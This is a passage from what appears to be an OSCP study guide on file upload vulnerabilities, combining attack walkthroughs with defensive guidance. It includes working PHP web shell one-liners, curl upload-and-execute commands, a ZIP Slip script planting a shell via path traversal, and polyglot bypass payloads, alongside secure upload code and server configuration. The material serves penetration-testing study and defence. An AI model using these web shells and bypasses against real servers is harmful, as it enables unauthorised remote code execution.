# Create shell.jpg with PHP code
echo '<?php system($_GET["c"]); ?>' > shell.jpg

# Upload
curl -X POST http://192.168.50.20/documents/upload \
  -F "file=@shell.jpg"
```

**Step 4: Execute**
```bash
curl "http://192.168.50.20/documents/uploads/shell.jpg?c=whoami"
# www-data
```

### Scenario 3: ZIP Slip to Overwrite

**Target**: `http://192.168.50.30/import` (accepts ZIP)

**Step 1: Create Malicious ZIP**
```python
#!/usr/bin/env python3
import zipfile

# Create shell
shell_code = '<?php system($_GET["c"]); ?>'

# Create ZIP with path traversal
with zipfile.ZipFile('malicious.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', shell_code)

print("[+] Malicious ZIP created")
```

**Step 2: Upload**
```bash
curl -X POST http://192.168.50.30/import \
  -F "archive=@malicious.zip"
```

**Step 3: Execute**
```bash
curl "http://192.168.50.30/shell.php?c=id"
# uid=33(www-data)
```

---

## 20. Defense Strategies

### 20.1 Secure Upload Implementation

**Complete Secure Example (PHP)**:
```php
<?php
// 1. Validate file size
$max_size = 2 * 1024 * 1024; // 2MB
if ($_FILES['file']['size'] > $max_size) {
    die("File too large");
}

// 2. Allowlist extensions (NOT blacklist)
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed_extensions)) {
    die("Invalid extension");
}

// 3. Validate MIME type (server-side)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mimes)) {
    die("Invalid MIME type");
}

// 4. Validate magic bytes
$handle = fopen($_FILES['file']['tmp_name'], 'r');
$header = fread($handle, 8);
fclose($handle);

$valid_headers = [
    "\xFF\xD8\xFF",        // JPEG
    "\x89\x50\x4E\x47",    // PNG
    "GIF89a",              // GIF
    "GIF87a"               // GIF
];

$is_valid = false;
foreach ($valid_headers as $valid_header) {
    if (strpos($header, $valid_header) === 0) {
        $is_valid = true;
        break;
    }
}

if (!$is_valid) {
    die("Invalid file header");
}

// 5. Generate random filename (prevent guessing)
$new_filename = bin2hex(random_bytes(16)) . '.' . $ext;

// 6. Store outside webroot OR disable execution
$upload_dir = '/var/uploads/';  // Outside /var/www/html
$target_path = $upload_dir . $new_filename;

// 7. Move file
if (!move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
    die("Upload failed");
}

// 8. Set restrictive permissions
chmod($target_path, 0444);  // Read-only

// 9. Store metadata in database (not filesystem)
// INSERT INTO uploads (user_id, original_name, stored_name, upload_time)

echo "File uploaded successfully: $new_filename";
?>
```

### 20.2 Web Server Configuration

**Apache - Disable Execution**:
```apache
# In uploads directory .htaccess
<Directory "/var/www/html/uploads">
    php_flag engine off
    Options -Indexes
    <FilesMatch "\.ph(p[3457]?|t|tml)$">
        Require all denied
    </FilesMatch>
</Directory>
```

**Nginx - Disable Execution**:
```nginx
location ^~ /uploads/ {
    # Serve files but don't execute
    location ~ \.php$ {
        deny all;
    }
}
```

### 20.3 Storage Isolation

**Best Practice**: Store uploads on separate domain/service.

```
Main App: app.example.com
Uploads:  cdn.example.com (static file server, NO PHP/ASP execution)
        OR
        AWS S3 (storage only, no code execution)
```

---

## 21. Common Pitfalls

**Pitfall 1: Trusting Client-Provided Data**
```php
// WRONG
$mime = $_FILES['file']['type'];  // From client!
```

**Pitfall 2: Extension Blacklisting**
```php
// WRONG (endless alternatives)
$blocked = ['.php', '.asp', '.jsp'];
// Bypass: .phtml, .php5, .aspx, etc.
```

**Pitfall 3: Incomplete Magic Byte Check**
```php
// WRONG
$header = fread($file, 3);
if ($header == "\xFF\xD8\xFF") { /* JPEG */ }
// Polyglot: GIF89a<?php system($_GET['c']); ?>
```

**Pitfall 4: Execution in Upload Directory**
```
/var/www/html/uploads/shell.php ← Accessible + Executable = RCE
```

**Pitfall 5: Predictable Filenames**
```php
// WRONG
$filename = $_FILES['file']['name'];  // attacker.php
```

---

## 22. Hands-on Exercises

### Exercise 1: Basic Bypass Lab

**Setup**: Deploy DVWA or bWAPP

**Tasks**:
- [ ] Upload PHP shell (blocked)
- [ ] Bypass with .phtml extension
- [ ] Bypass with MIME type change
- [ ] Achieve RCE

### Exercise 2: Polyglot Creation

**Tasks**:
- [ ] Create GIF+PHP polyglot
- [ ] Create JPEG+PHP polyglot with exiftool
- [ ] Test against upload filters

### Exercise 3: .htaccess Attack

**Tasks**:
- [ ] Upload .htaccess to change execution rules
- [ ] Upload image file with PHP code
- [ ] Execute and gain RCE

---

## 23. Interview Questions

**Q1: What's the difference between client-side and server-side file validation?**

**A**: Client-side validation (JavaScript) can be bypassed by disabling JS, using Burp, or cURL. Server-side validation runs on the server and is harder to bypass, but still vulnerable if it relies on client-provided data (MIME type, extension from filename).

---

**Q2: How does getimagesize() work and can it be bypassed?**

**A**: `getimagesize()` reads the file header (magic bytes) to determine if it's a valid image. It can be bypassed with polyglots: adding image magic bytes (e.g., `GIF89a`) to a PHP file makes it appear as a valid GIF while still executing PHP code.

---

**Q3: What is a polyglot file?**

**A**: A polyglot is a file that's valid in multiple formats simultaneously. Example: A file that's both a valid JPEG (passes image validation) and valid PHP code (executes when requested). Created by embedding PHP in JPEG comment/metadata sections.

---

**Q4: Why is extension blacklisting ineffective?**

**A**: Too many alternative extensions exist (.php, .phtml, .php3, .php4, .php5, .php7, .phar, etc.). Also vulnerable to case manipulation (.PhP), double extensions (.php.jpg), and null bytes (.php%00.jpg). Allowlisting is the correct approach.

---

**Q5: Explain the ZIP Slip vulnerability.**

**A**: When an application extracts uploaded ZIP files without validating file paths, attackers can create archives with path traversal in filenames (e.g., `../../../../var/www/html/shell.php`). Upon extraction, files are written outside the intended directory, potentially overwriting critical files or placing webshells in accessible locations.

---

## 24. Summary & Key Takeaways

### Critical Concepts

1. **Never Trust Client Data**: Extension, MIME type, filename all attacker-controlled
2. **Polyglots Bypass Magic Bytes**: GIF89a + PHP = valid image + executable code
3. **Execution is Key**: Upload alone isn't enough; need to execute the code
4. **.htaccess Changes Rules**: Can make Apache execute images as PHP
5. **Storage Isolation**: Best defense is storing uploads where they can't execute

### OSCP Exam Tips

1. **Always test upload features** - guaranteed on exam
2. **Start simple**: Direct .php upload
3. **Try alternatives**: .phtml, .php5, .php3
4. **Use polyglots**: GIF89a<?php ... ?>
5. **Try .htaccess**: If upload allowed, change execution rules
6. **Check response**: Note upload path for execution
7. **Time allocation**: 20-30 minutes per upload feature

### Common Bypass Chain
```
1. Try shell.php → Blocked (extension filter)
2. Try shell.phtml → Blocked (MIME type check)
3. Add GIF89a header → Blocked (still wrong extension)
4. Use shell.php with GIF89a + MIME bypass → SUCCESS
5. Access /uploads/shell.php?c=id → RCE achieved
```

### Defense Checklist

- [ ] Allowlist extensions (NOT blacklist)
- [ ] Validate MIME type server-side
- [ ] Check magic bytes (first 8+ bytes)
- [ ] Re-encode images (destroys polyglots)
- [ ] Random filenames (prevent guessing)
- [ ] Store outside webroot OR disable execution
- [ ] Set restrictive file permissions
- [ ] Implement file size limits
- [ ] Scan with antivirus
- [ ] Log all upload attempts

---

## 25. References & Further Reading

### OWASP Resources
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

### Tools
- [Fuxploider](https://github.com/almandin/fuxploider) - File upload fuzzer
- [Upload Scanner (Burp)](https://portswigger.net/bappstore) - Burp extension
- [exiftool](https://exiftool.org/) - Metadata manipulation

### Related Topics
- [[02_OWASP_Top_10_Modern]] - Injection and security misconfigurations
- [[04_XSS_Client_Side_Attacks]] - SVG XSS via file upload
- [[05_Broken_Access_Control]] - Path traversal in uploads

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

**Total Lines**: ~2,000 lines | **OSCP Relevance**: CRITICAL (90%) | **Difficulty**: Intermediate to Advanced
